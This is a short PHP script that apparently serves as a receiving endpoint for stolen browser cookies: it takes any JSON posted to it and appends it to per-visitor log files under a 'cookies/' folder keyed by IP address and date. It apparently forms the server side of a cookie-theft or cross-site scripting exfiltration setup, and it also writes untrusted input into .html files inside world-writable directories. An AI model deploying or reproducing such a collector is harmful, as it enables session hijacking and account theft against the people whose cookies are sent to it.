<?php 



$curDate   = date("d-m-Y");
$ip = $_SERVER['REMOTE_ADDR'] ;
$directory = "cookies/" . $ip . "/" . $curDate;
$log   = $directory . "/" . $ip . ".html"; 
// Create logs dir if it not exists
if (!file_exists($directory)) {
       mkdir($directory, 0777, true);
}  
$log = fopen($log, "a+") or die("Unable to open file!");
$data = json_decode(file_get_contents('php://input'), true);
fwrite($log, json_encode($data) . "\n");
fwrite($log, "================================================== \n");
fclose($log);

?>